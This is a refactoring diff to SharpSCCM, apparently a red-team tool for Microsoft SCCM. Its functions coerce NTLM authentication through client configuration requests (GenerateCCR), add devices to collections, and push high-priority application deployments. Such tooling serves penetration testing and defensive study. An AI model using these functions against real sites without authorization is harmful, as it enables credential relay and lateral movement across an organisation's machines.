@@ -4,7 +4,7 @@ using System.Management;
 
 namespace SharpSCCM
 {
-    static class MgmtPointWmi
+    public static class MgmtPointWmi
     {
         public static void AddDeviceToCollection(ManagementScope scope, string deviceName, string collectionName)
         {
@@ -39,19 +39,19 @@ namespace SharpSCCM
                 collection.InvokeMethod("AddMembershipRule", addMembershipRuleParams, null);
             }
             Console.WriteLine($"[+] Added {userName} to {collectionName}");
-            Console.WriteLine("[+] Waiting 10s for collection to populate");
-            System.Threading.Thread.Sleep(10000);
+            Console.WriteLine("[+] Waiting 15s for collection to populate");
+            System.Threading.Thread.Sleep(15000);
             GetCollectionMember(scope, collectionName, false, null, null, false, false);
         }
 
-        public static void GenerateCCR(string server, string sitecode, string target)
+        public static void GenerateCCR(string target, string server = null, string siteCode = null)
         {
-            ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
             Console.WriteLine($"[+] Generating a client configuration request (CCR) to coerce authentication to {target}");
-            ManagementClass collectionClass = new ManagementClass(sccmConnection, new ManagementPath("SMS_Collection"), null);
+            ManagementClass collectionClass = new ManagementClass(wmiConnection, new ManagementPath("SMS_Collection"), null);
             ManagementBaseObject generatorParams = collectionClass.GetMethodParameters("GenerateCCRByName");
             generatorParams.SetPropertyValue("Name", target);
-            generatorParams.SetPropertyValue("PushSiteCode", sitecode);
+            generatorParams.SetPropertyValue("PushSiteCode", siteCode);
             generatorParams.SetPropertyValue("Forced", false);
             collectionClass.InvokeMethod("GenerateCCRByName", generatorParams, null);
         }
@@ -74,10 +74,10 @@ namespace SharpSCCM
             }
         }
 
-        public static void GetSitePushSettings(string server, string sitecode)
+        public static void GetSitePushSettings(string server = null, string siteCode = null)
         {
-            ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
-            ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
+            ManagementScope wmiConnection = MgmtUtil.NewWmiConnection(server, null, siteCode);
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT PropertyName, Value, Value1 FROM SMS_SCI_SCProperty WHERE ItemType='SMS_DISCOVERY_DATA_MANAGER' AND (PropertyName='ENABLEKERBEROSCHECK' OR PropertyName='FILTERS' OR PropertyName='SETTINGS')"));
             ManagementObjectCollection results = searcher.Get();
             foreach (ManagementObject result in results)
             {
@@ -126,7 +126,7 @@ namespace SharpSCCM
                     }
                 }
             }
-            searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery($"SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
+            searcher = new ManagementObjectSearcher(wmiConnection, new ObjectQuery($"SELECT Values FROM SMS_SCI_SCPropertyList WHERE PropertyListName='Reserved2'"));
             results = searcher.Get();
             foreach (ManagementObject result in results)
             {
@@ -185,7 +185,7 @@ namespace SharpSCCM
         
         public static void InvokeLastLogonUpdate(ManagementScope scope, string collectionName)
         {
-            // TO DO
+            // TODO
         }
 
         public static void InvokeUpdate(ManagementScope scope, string collectionName)
@@ -362,7 +362,8 @@ namespace SharpSCCM
                 </AppMgmtDigest>
                 ";
 
-                // Debug XML with assistance from Config Manager SDK
+                //
+                // XML with assistance from Config Manager SDK
                 //Application appInstance = SccmSerializer.DeserializeFromString(xml, true);
                 //string xmla = SccmSerializer.SerializeToString(appInstance, true);
 
@@ -418,7 +419,7 @@ namespace SharpSCCM
             else
             {
                 Console.WriteLine($"[+] Creating new deployment of {application} to {collection}");
-                string sitecode = scope.Path.ToString().Split('_').Last();
+                string siteCode = scope.Path.ToString().Split('_').Last();
                 string now = DateTime.Now.ToString("yyyyMMddHHmmss" + ".000000+***");
                 ManagementObject deployment = new ManagementClass(scope, new ManagementPath("SMS_ApplicationAssignment"), null).CreateInstance();
                 deployment["ApplicationName"] = application;
@@ -436,7 +437,7 @@ namespace SharpSCCM
                 deployment["Priority"] = 2; // HIGH
                 deployment["RebootOutsideOfServiceWindows"] = false;
                 deployment["SoftDeadlineEnabled"] = true;
-                deployment["SourceSite"] = sitecode;
+                deployment["SourceSite"] = siteCode;
                 deployment["StartTime"] = now;
                 deployment["SuppressReboot"] = 0;
                 deployment["UseGMTTimes"] = true;
